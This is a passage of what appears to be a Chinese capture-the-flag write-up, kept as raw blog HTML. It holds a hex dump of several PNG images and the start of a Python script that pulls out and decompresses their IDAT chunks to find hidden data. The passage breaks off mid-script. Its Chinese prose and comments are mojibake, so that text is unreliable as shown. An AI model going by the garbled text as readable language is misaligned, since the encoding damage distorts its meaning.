class="line">84e1556e00</span><br><span class="line">c40ebcd131</span><br><span class="line">5ce52816a9</span><br><span class="line">5dc509256f</span><br><span class="line">0cc10c0cc6</span><br><span class="line">246d793be9</span><br><span class="line">bfef62e9f7</span><br><span class="line">fe422d3411</span><br><span class="line">f54e84cc4b</span><br><span class="line">de275ff584</span><br><span class="line">012d983077</span><br><span class="line">dce4e9452b</span><br><span class="line">7165f1b1a8</span><br><span class="line">1199130ffe</span><br><span class="line">e9def0305f</span><br><span class="line">ffdef73240</span><br><span class="line">f22a3d701c</span><br><span class="line">27b4e5bc01</span><br><span class="line">2d47274d0c</span><br><span class="line">6ad6ad0000</span><br><span class="line">000049454e</span><br><span class="line">44ae426082</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">89504e470d</span><br><span class="line">0a1a0a0000</span><br><span class="line">000d494844</span><br><span class="line">5200000064</span><br><span class="line">0000006408</span><br><span class="line">02000000ff</span><br><span class="line">8002030000</span><br><span class="line">004e494441</span><br><span class="line">54789c0dca</span><br><span class="line">c10d853008</span><br><span class="line">06e055fe01</span><br><span class="line">8c2b78f6f4</span><br><span class="line">2e2ed00815</span><br><span class="line">621f241453</span><br><span class="line">c7aff7ef57</span><br><span class="line">71fa139db1</span><br><span class="line">e3361f2b0e</span><br><span class="line">618812b1c1</span><br><span class="line">432fb5d290</span><br><span class="line">fc266af81f</span><br><span class="line">2925315883</span><br><span class="line">e08dd03579</span><br><span class="line">c1c724b709</span><br><span class="line">ef0c1ac174</span><br><span class="line">53fabc0000</span><br><span class="line">000049454e</span><br><span class="line">44ae426082</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">89504e470d</span><br><span class="line">0a1a0a0000</span><br><span class="line">000d494844</span><br><span class="line">5200000064</span><br><span class="line">0000006408</span><br><span class="line">02000000ff</span><br><span class="line">8002030000</span><br><span class="line">0077494441</span><br><span class="line">54789c35cb</span><br><span class="line">c109023110</span><br><span class="line">85e1565e01</span><br><span class="line">b20578f368</span><br><span class="line">059e9f9981</span><br><span class="line">0477276132</span><br><span class="line">b0e4661156</span><br><span class="line">68251b17bc</span><br><span class="line">3c1e1ffc8f</span><br><span class="line">cc40a2e18e</span><br><span class="line">cef17d7fea</span><br><span class="line">2ac87c96e8</span><br><span class="line">90a2f3ba2c</span><br><span class="line">b8d9d8392e</span><br><span class="line">88ac285bab</span><br><span class="line">1eb440a3c7</span><br><span class="line">f5b4ceadad</span><br><span class="line">3a21bd3440</span><br><span class="line">935353f539</span><br><span class="line">a56575705e</span><br><span class="line">b5e4a3850a</span><br><span class="line">f612f91ffe</span><br><span class="line">b2def7eab2</span><br><span class="line">1c590233be</span><br><span class="line">d2da926700</span><br><span class="line">0000004945</span><br><span class="line">4e44ae4260</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">89504e470d</span><br><span class="line">0a1a0a0000</span><br><span class="line">000d494844</span><br><span class="line">5200000064</span><br><span class="line">0000006408</span><br><span class="line">02000000ff</span><br><span class="line">8002030000</span><br><span class="line">004e494441</span><br><span class="line">54789c1dc8</span><br><span class="line">c10d80200c</span><br><span class="line">05d055fe00</span><br><span class="line">86358c6727</span><br><span class="line">a85084a452</span><br><span class="line">526b8cdb43</span><br><span class="line">bcbdbc551d</span><br><span class="line">d5037645cd</span><br><span class="line">d810a92171</span><br><span class="line">b4af3bbc30</span><br><span class="line">6ebabaf0f2</span><br><span class="line">db9804da66</span><br><span class="line">167d24e198</span><br><span class="line">72a37a16cf</span><br><span class="line">6a2f590a03</span><br><span class="line">31661bf2d5</span><br><span class="line">efa9b80000</span><br><span class="line">000049454e</span><br><span class="line">44ae426082</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">89504e470d</span><br><span class="line">0a1a0a0000</span><br><span class="line">000d494844</span><br><span class="line">5200000064</span><br><span class="line">0000006408</span><br><span class="line">02000000ff</span><br><span class="line">8002030000</span><br><span class="line">0032494441</span><br><span class="line">54789c0540</span><br><span class="line">d109804008</span><br><span class="line">5de54de016</span><br><span class="line">4dd004920f</span><br><span class="line">fc30894eb8</span><br><span class="line">737bb98e3e</span><br><span class="line">152db89986</span><br><span class="line">7262e9fb05</span><br><span class="line">b19d899f6a</span><br><span class="line">2d03ef110c</span><br><span class="line">eb25c50dbd</span><br><span class="line">0000000049</span><br><span class="line">454e44ae42</span><br><span class="line">6082</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">89504e470d</span><br><span class="line">0a1a0a0000</span><br><span class="line">000d494844</span><br><span class="line">5200000064</span><br><span class="line">0000006408</span><br><span class="line">02000000ff</span><br><span class="line">8002030000</span><br><span class="line">002e494441</span><br><span class="line">54789c0dc6</span><br><span class="line">b109002010</span><br><span class="line">03c0553241</span><br><span class="line">d610c70828</span><br><span class="line">d88860f7dd</span><br><span class="line">aff1eb3949</span><br><span class="line">ecaebfac8d</span><br><span class="line">3b35826807</span><br><span class="line">5a9f346730</span><br><span class="line">082ca3a97e</span><br><span class="line">5100000000</span><br><span class="line">49454e44ae</span><br><span class="line">426082</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">89504e470d</span><br><span class="line">0a1a0a0000</span><br><span class="line">000d494844</span><br><span class="line">5200000064</span><br><span class="line">0000006408</span><br><span class="line">02000000ff</span><br><span class="line">8002030000</span><br><span class="line">0288494441</span><br><span class="line">54789c8593</span><br><span class="line">49afaa4a14</span><br><span class="line">857f9003e0</span><br><span class="line">28028337d8</span><br><span class="line">55b4d22888</span><br><span class="line">88cca491be</span><br><span class="line">11d0027efd</span><br><span class="line">c5fb4eee1b</span><br><span class="line">bc9b9c2fa9</span><br><span class="line">9d95546ad5</span><br><span class="line">aeec551769</span><br><span class="line">1011b2016c</span><br><span class="line">d0008d7222</span><br><span class="line">bf182da7e3</span><br><span class="line">880080fa29</span><br><span class="line">70f894a8f1</span><br><span class="line">86c0375fb1</span><br><span class="line">9ad19cff72</span><br><span class="line">902c866da1</span><br><span class="line">e8192cace0</span><br><span class="line">dd75a923e2</span><br><span class="line">9eeaf57bd0</span><br><span class="line">3c2fd36363</span><br><span class="line">992addcfe1</span><br><span class="line">b507f39490</span><br><span class="line">809a95d9e8</span><br><span class="line">4ddd2e2c2d</span><br><span class="line">92c2134c45</span><br><span class="line">7d625b37e3</span><br><span class="line">1f278ef372</span><br><span class="line">86343259ac</span><br><span class="line">2d87eade16</span><br><span class="line">ceb8c45f9c</span><br><span class="line">8ca9297986</span><br><span class="line">29a1d46b24</span><br><span class="line">76e932486d</span><br><span class="line">6e754f5708</span><br><span class="line">dcac0fe11c</span><br><span class="line">cd293bcc8f</span><br><span class="line">436ddda3b1</span><br><span class="line">482acb4306</span><br><span class="line">10fb022001</span><br><span class="line">06ac1cfd2c</span><br><span class="line">ece2b7c2cc</span><br><span class="line">035a9fe041</span><br><span class="line">0a80d705aa</span><br><span class="line">95853e1a82</span><br><span class="line">334b27aa0b</span><br><span class="line">cc63de45a6</span><br><span class="line">1190a07435</span><br><span class="line">a6964a9e9f</span><br><span class="line">8ffe2cf475</span><br><span class="line">e886d842f6</span><br><span class="line">b115b2a76e</span><br><span class="line">9ff4fdbb08</span><br><span class="line">bc56b8e3d1</span><br><span class="line">f51e555dea</span><br><span class="line">37c513840d</span><br><span class="line">cb3cfd306f</span><br><span class="line">6a85bb2a79</span><br><span class="line">c95edec6a1</span><br><span class="line">144cdd6907</span><br><span class="line">37435834d5</span><br><span class="line">be2ef2f088</span><br><span class="line">9762b12483</span><br><span class="line">48a934fbbc</span><br><span class="line">583c0fe539</span><br><span class="line">e23b4d26c5</span><br><span class="line">a675cc6d18</span><br><span class="line">ee725a199d</span><br><span class="line">2924cf7498</span><br><span class="line">f098925c8f</span><br><span class="line">b1d7fa5e9c</span><br><span class="line">8c16e7e886</span><br><span class="line">6673a2b851</span><br><span class="line">5f6f2ae846</span><br><span class="line">2b8ee9d9b1</span><br><span class="line">d47c100c09</span><br><span class="line">b6558b369a</span><br><span class="line">1a6c629dd3</span><br><span class="line">cae679ca76</span><br><span class="line">d54de60f04</span><br><span class="line">8a89a508e9</span><br><span class="line">e81b987b14</span><br><span class="line">2511f78277</span><br><span class="line">b947ecc874</span><br><span class="line">d232d64c6f</span><br><span class="line">54bc5b34b9</span><br><span class="line">b7b054882e</span><br><span class="line">6ecb18c5c5</span><br><span class="line">6fee3dd535</span><br><span class="line">3563bd2541</span><br><span class="line">82d7b450c3</span><br><span class="line">3edc1c792a</span><br><span class="line">211c053b6d</span><br><span class="line">8cad83b288</span><br><span class="line">af38dbdf2e</span><br><span class="line">c623f7b61d</span><br><span class="line">767d590b9d</span><br><span class="line">9d82939d41</span><br><span class="line">ca36bb065a</span><br><span class="line">05c53cc066</span><br><span class="line">319c3e2d5d</span><br><span class="line">b1450cfdbe</span><br><span class="line">c696123f5a</span><br><span class="line">0495e1b497</span><br><span class="line">3810d8facc</span><br><span class="line">f9ebe5beb7</span><br><span class="line">63d619da1a</span><br><span class="line">053f6512af</span><br><span class="line">fbdf687f14</span><br><span class="line">9ae3eb5445</span><br><span class="line">f367aeb6be</span><br><span class="line">86e01b0914</span><br><span class="line">40da7bfbe0</span><br><span class="line">bfaa255a7d</span><br><span class="line">ff02b2cf44</span><br><span class="line">c227023fe5</span><br><span class="line">a7fc73e4b7</span><br><span class="line">3fbefffe1f</span><br><span class="line">5ff2182953</span><br><span class="line">6534ce2e86</span><br><span class="line">f6bf9e6cb8</span><br><span class="line">817ca287a0</span><br><span class="line">38fa16f9f8</span><br><span class="line">fc1f1919c8</span><br><span class="line">befdabd3d5</span><br><span class="line">d58856218e</span><br><span class="line">df7dfef30b</span><br><span class="line">57f02b833b</span><br><span class="line">ffa6360000</span><br><span class="line">000049454e</span><br><span class="line">44ae426082</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">89504e470d</span><br><span class="line">0a1a0a0000</span><br><span class="line">000d494844</span><br><span class="line">5200000064</span><br><span class="line">0000006408</span><br><span class="line">02000000ff</span><br><span class="line">8002030000</span><br><span class="line">003a494441</span><br><span class="line">54789c0dc8</span><br><span class="line">c109c03008</span><br><span class="line">05d055fe00</span><br><span class="line">c529ba4808</span><br><span class="line">62a5108315</span><br><span class="line">82b74ed3c1</span><br><span class="line">3289bd3eb1</span><br><span class="line">8006e1e4ee</span><br><span class="line">394387ecf7</span><br><span class="line">4372bb8edf</span><br><span class="line">b1ccef870a</span><br><span class="line">0d610e2b0d</span><br><span class="line">1dbe690000</span><br><span class="line">000049454e</span><br><span class="line">44ae426082</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">89504e470d</span><br><span class="line">0a1a0a0000</span><br><span class="line">000d494844</span><br><span class="line">5200000064</span><br><span class="line">0000006408</span><br><span class="line">02000000ff</span><br><span class="line">8002030000</span><br><span class="line">0032494441</span><br><span class="line">54789c0540</span><br><span class="line">510d805008</span><br><span class="line">ac7209a861</span><br><span class="line">8157e0d4db</span><br><span class="line">7043f880fa</span><br><span class="line">1fecaa7a0d</span><br><span class="line">c739f8c56c</span><br><span class="line">8c0b8f3353</span><br><span class="line">81afd1c33b</span><br><span class="line">640b0f280d</span><br><span class="line">bc9c6d025f</span><br><span class="line">0000000049</span><br><span class="line">454e44ae42</span><br><span class="line">6082</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">89504e470d</span><br><span class="line">0a1a0a0000</span><br><span class="line">000d494844</span><br><span class="line">5200000064</span><br><span class="line">0000006408</span><br><span class="line">02000000ff</span><br><span class="line">8002030000</span><br><span class="line">0044494441</span><br><span class="line">54789c1dc7</span><br><span class="line">c109803010</span><br><span class="line">04c056b600</span><br><span class="line">490f56e15b</span><br><span class="line">c872170817</span><br><span class="line">58a3909f6d</span><br><span class="line">d89e9544fc</span><br><span class="line">cdac55c5bc</span><br><span class="line">276ccee045</span><br><span class="line">61b4f3bd1f</span><br><span class="line">11e29ec782</span><br><span class="line">8391d1fd7f</span><br><span class="line">fd50c2d204</span><br><span class="line">3b6714658f</span><br><span class="line">fd21a50000</span><br><span class="line">000049454e</span><br><span class="line">44ae426082</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">89504e470d</span><br><span class="line">0a1a0a0000</span><br><span class="line">000d494844</span><br><span class="line">5200000064</span><br><span class="line">0000006408</span><br><span class="line">02000000ff</span><br><span class="line">8002030000</span><br><span class="line">005e494441</span><br><span class="line">54789c0dcb</span><br><span class="line">b10dc3300c</span><br><span class="line">44d1556e80</span><br><span class="line">202b648934</span><br><span class="line">296df96012</span><br><span class="line">9044833ac1</span><br><span class="line">c8f656f3aa</span><br><span class="line">ffbf4694c8</span><br><span class="line">855fc6c4ed</span><br><span class="line">b56227945b</span><br><span class="line">1fcd251e90</span><br><span class="line">65ccd31033</span><br><span class="line">31589242b1</span><br><span class="line">ad77d6377e</span><br><span class="line">31916c6cfb</span><br><span class="line">9a2d6e2870</span><br><span class="line">ace67f09ae</span><br><span class="line">17d24fd3e7</span><br><span class="line">0193812576</span><br><span class="line">37cac13300</span><br><span class="line">0000004945</span><br><span class="line">4e44ae4260</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">89504e470d</span><br><span class="line">0a1a0a0000</span><br><span class="line">000d494844</span><br><span class="line">5200000064</span><br><span class="line">0000006408</span><br><span class="line">02000000ff</span><br><span class="line">8002030000</span><br><span class="line">004b494441</span><br><span class="line">54789c3dca</span><br><span class="line">3111853010</span><br><span class="line">04502bab20</span><br><span class="line">3ea8285090</span><br><span class="line">49165271cc</span><br><span class="line">fe3bfea4c3</span><br><span class="line">06f650122a</span><br><span class="line">eaf7e615c5</span><br><span class="line">423f264ccf</span><br><span class="line">759fc4660e</span><br><span class="line">6fc4212bac</span><br><span class="line">2142ccb527</span><br><span class="line">2c9ee5f837</span><br><span class="line">eee8166ffe</span><br><span class="line">680097a21a</span><br><span class="line">9de6acc0a6</span><br><span class="line">0000000049</span><br><span class="line">454e44ae42</span><br><span class="line">6082</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">89504e470d</span><br><span class="line">0a1a0a0000</span><br><span class="line">000d494844</span><br><span class="line">5200000064</span><br><span class="line">0000006408</span><br><span class="line">02000000ff</span><br><span class="line">8002030000</span><br><span class="line">0049494441</span><br><span class="line">54789c0540</span><br><span class="line">c109c42010</span><br><span class="line">6c652ab089</span><br><span class="line">dc2775e898</span><br><span class="line">2cc8ae0c2a</span><br><span class="line">f8bb22aec2</span><br><span class="line">ab443ee14c</span><br><span class="line">b84244b6fe</span><br><span class="line">52a8b3b50d</span><br><span class="line">31d3164bc2</span><br><span class="line">ed838f6c6c</span><br><span class="line">2ccaaab1fc</span><br><span class="line">bf3f0fe490</span><br><span class="line">661f169e0e</span><br><span class="line">7ab51a9d10</span><br><span class="line">4393060000</span><br><span class="line">000049454e</span><br><span class="line">44ae426082</span><br><span class="line"></span><br><span class="line">89504e470d</span><br><span class="line">0a1a0a0000</span><br><span class="line">000d494844</span><br><span class="line">5200000064</span><br><span class="line">0000006408</span><br><span class="line">02000000ff</span><br><span class="line">8002030000</span><br><span class="line">003c494441</span><br><span class="line">54789c0dc8</span><br><span class="line">310d80500c</span><br><span class="line">04502ba7a0</span><br><span class="line">1ed080820b</span><br><span class="line">34a501ae0b</span><br><span class="line">0cdd508330</span><br><span class="line">947cd637f3</span><br><span class="line">745c85aedb</span><br><span class="line">3069c5e6fd</span><br><span class="line">3d2f94cbef</span><br><span class="line">3cf65480c1</span><br><span class="line">940d5ae70f</span><br><span class="line">ed65adc4a8</span><br><span class="line">0000000049</span><br><span class="line">454e44ae42</span><br><span class="line">6082</span><br><span class="line"></span><br><span class="line">89504e470d</span><br><span class="line">0a1a0a0000</span><br><span class="line">000d494844</span><br><span class="line">5200000064</span><br><span class="line">0000006408</span><br><span class="line">02000000ff</span><br><span class="line">8002030000</span><br><span class="line">0025494441</span><br><span class="line">54789c0580</span><br><span class="line">310d002010</span><br><span class="line">03ad54413d</span><br><span class="line">e001030d5c</span><br><span class="line">18d8ea7ff8</span><br><span class="line">ac57b8d6ce</span><br><span class="line">4727c50339</span><br><span class="line">f506054df9</span><br><span class="line">d080000000</span><br><span class="line">0049454e44</span><br><span class="line">ae426082</span><br><span class="line"></span><br><span class="line">89504e470d</span><br><span class="line">0a1a0a0000</span><br><span class="line">000d494844</span><br><span class="line">5200000064</span><br><span class="line">0000006408</span><br><span class="line">02000000ff</span><br><span class="line">8002030000</span><br><span class="line">003a494441</span><br><span class="line">54789c0dc8</span><br><span class="line">c10d804008</span><br><span class="line">04c056b602</span><br><span class="line">daf0611526</span><br><span class="line">b72a1f3805</span><br><span class="line">a3760fcf99</span><br><span class="line">c57d085672</span><br><span class="line">224fb52370</span><br><span class="line">3dcac4ee77</span><br><span class="line">0761fc1a7c</span><br><span class="line">31b63fa400</span><br><span class="line">7d77105a77</span><br><span class="line">166a1f0000</span><br><span class="line">000049454e</span><br><span class="line">44ae426082</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">89504e470d</span><br><span class="line">0a1a0a0000</span><br><span class="line">000d494844</span><br><span class="line">5200000064</span><br><span class="line">0000006408</span><br><span class="line">02000000ff</span><br><span class="line">8002030000</span><br><span class="line">0038494441</span><br><span class="line">54789c0540</span><br><span class="line">b10d804008</span><br><span class="line">5ce5266092</span><br><span class="line">5fc092e2a2</span><br><span class="line">240a059768</span><br><span class="line">e91aaee724</span><br><span class="line">64a31f8645</span><br><span class="line">fdefd7c812</span><br><span class="line">6e0fa10b67</span><br><span class="line">e58ee42328</span><br><span class="line">2eda00482e</span><br><span class="line">0f5deadeb3</span><br><span class="line">d900000000</span><br><span class="line">49454e44ae</span><br><span class="line">426082</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">89504e470d</span><br><span class="line">0a1a0a0000</span><br><span class="line">000d494844</span><br><span class="line">5200000064</span><br><span class="line">0000006408</span><br><span class="line">02000000ff</span><br><span class="line">8002030000</span><br><span class="line">001b494441</span><br><span class="line">54789c0580</span><br><span class="line">c11000000c</span><br><span class="line">c35446509f</span><br><span class="line">51e4d3fae7</span><br><span class="line">9e5d21020d</span><br><span class="line">6002dea94f</span><br><span class="line">d8c4000000</span><br><span class="line">0049454e44</span><br><span class="line">ae426082</span><br></pre></td></tr></table></figure><p>è¿›è¡Œåˆ†æï¼Œå‘ç°æ¯ä¸€ä¸ªpngå‡æ˜¯IDATå—éšå†™ï¼Œæ•°æ®éšè—åœ¨IDATå—ä¸­ï¼Œå†™è„šæœ¬æå–æ‰€æœ‰æ•°æ®å†…å®¹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_png_data</span>(<span class="params">hex_data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;è§£æPNGæ•°æ®å¹¶æå–IDATå—&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># å°†åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚</span></span><br><span class="line">    png_bytes = <span class="built_in">bytes</span>.fromhex(hex_data)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># PNGæ–‡ä»¶å¤´</span></span><br><span class="line">    png_header = png_bytes[:<span class="number">8</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># æŸ¥æ‰¾æ‰€æœ‰IDATå—</span></span><br><span class="line">    idat_chunks = []</span><br><span class="line">    offset = <span class="number">8</span>  <span class="comment"># è·³è¿‡PNGæ–‡ä»¶å¤´</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> offset &lt; <span class="built_in">len</span>(png_bytes):</span><br><span class="line">        <span class="comment"># è¯»å–å—é•¿åº¦ (4 bytes)</span></span><br><span class="line">        <span class="keyword">if</span> offset + <span class="number">4</span> &gt; <span class="built_in">len</span>(png_bytes):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        chunk_length = struct.unpack(<span class="string">&#x27;&gt;I&#x27;</span>, png_bytes[offset:offset+<span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line">        offset += <span class="number">4</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># è¯»å–å—ç±»å‹ (4 bytes)</span></span><br><span class="line">        <span class="keyword">if</span> offset + <span class="number">4</span> &gt; <span class="built_in">len</span>(png_bytes):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        chunk_type = png_bytes[offset:offset+<span class="number">4</span>]</span><br><span class="line">        offset += <span class="number">4</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># è¯»å–å—æ•°æ®</span></span><br><span class="line">        <span class="keyword">if</span> offset + chunk_length &gt; <span class="built_in">len</span>(png_bytes):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        chunk_data = png_bytes[offset:offset+chunk_length]</span><br><span class="line">        offset += chunk_length</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># è¯»å–CRC (4 bytes)</span></span><br><span class="line">        <span class="keyword">if</span> offset + <span class="number">4</span> &gt; <span class="built_in">len</span>(png_bytes):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        crc = png_bytes[offset:offset+<span class="number">4</span>]</span><br><span class="line">        offset += <span class="number">4</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># å¦‚æœæ˜¯IDATå—ï¼Œä¿å­˜æ•°æ®</span></span><br><span class="line">        <span class="keyword">if</span> chunk_type == <span class="string">b&#x27;IDAT&#x27;</span>:</span><br><span class="line">            idat_chunks.append(chunk_data)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> idat_chunks</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">analyze_idat_data</span>(<span class="params">idat_data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;åˆ†æè§£å‹åçš„IDATæ•°æ®&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># è§£å‹IDATæ•°æ®</span></span><br><span class="line">        decompressed = zlib.decompress(idat_data)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># åŸå§‹å­—èŠ‚æ•°æ®</span></span><br><span class="line">        raw_bytes = decompressed</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ASCIIè¡¨ç¤ºï¼ˆå°†å¯æ‰“å°å­—ç¬¦æ˜¾ç¤ºï¼Œä¸å¯æ‰“å°å­—ç¬¦æ˜¾ç¤ºä¸ºç‚¹ï¼‰</span></span><br><span class="line">        ascii_repr = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(b) <span class="keyword">if</span> <span class="number">32</span> &lt;= b &lt;= <span class="number">126</span> <span class="keyword">else</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">for</span> b <span class="keyword">in</span> raw_bytes)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> raw_bytes, ascii_repr</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="string">f&quot;è§£å‹é”™è¯¯: <span class="subst">&#123;e&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># è¯»å–æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;111.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read().strip()</span><br><span class="line">    <span class="comment">#content = input()</span></span><br><span class="line">    <span class="comment"># æŒ‰89504e47åˆ†å‰²PNGæ•°æ®</span></span><br><span class="line">    png_marker = <span class="string">&#x27;89504e47&#x27;</span></span><br><span class="line">    png_hex_strings = content.split(png_marker)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># ç¬¬ä¸€ä¸ªå…ƒç´ å¯èƒ½æ˜¯ç©ºçš„ï¼Œä»ç¬¬äºŒä¸ªå¼€å§‹å¤„ç†</span></span><br><span class="line">    png_data_list = []</span><br><span class="line">    <span class="keyword">for</span> hex_str <span class="keyword">in</span> png_hex_strings[<span class="number">1</span>:]:</span><br><span class="line">        <span class="comment"># é‡æ–°æ·»åŠ PNGæ ‡è®°</span></span><br><span class="line">        full_png_hex = png_marker + hex_str</span><br><span class="line">        png_data_list.append(full_png_hex)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;æ‰¾åˆ° <span class="subst">&#123;<span class="built_in">len</span>(png_data_list)&#125;</span> ä¸ªPNGæ–‡ä»¶&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># å¤„ç†æ¯ä¸ªPNG</span></span><br><span class="line">    <span class="keyword">for</span> i, png_hex <span class="keyword">in</span> <span class="built_in">enumerate</span>(png_data_list, <span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n<span class="subst">&#123;<span class="string">&#x27;=&#x27;</span>*<span class="number">60</span>&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;PNG #<span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="string">&#x27;=&#x27;</span>*<span class="number">60</span>&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># æå–IDATå—</span></span><br><span class="line">            idat_chunks = parse_png_data(png_hex)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> idat_chunks:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;æœªæ‰¾åˆ°IDATå—&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">                </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;æ‰¾åˆ° <span class="subst">&#123;<span class="built_in">len</span>(idat_chunks)&#125;</span> ä¸ªIDATå—&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># åˆå¹¶æ‰€æœ‰IDATå—æ•°æ®</span></span><br><span class="line">            all_idat_data = <span class="string">b&#x27;&#x27;</span>.join(idat_chunks)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># åˆ†æIDATæ•°æ®</span></span><br><span class="line">            raw_data, ascii_repr = analyze_idat_data(all_idat_data)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> raw_data <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;è§£å‹åæ•°æ®é•¿åº¦: <span class="subst">&#123;<span 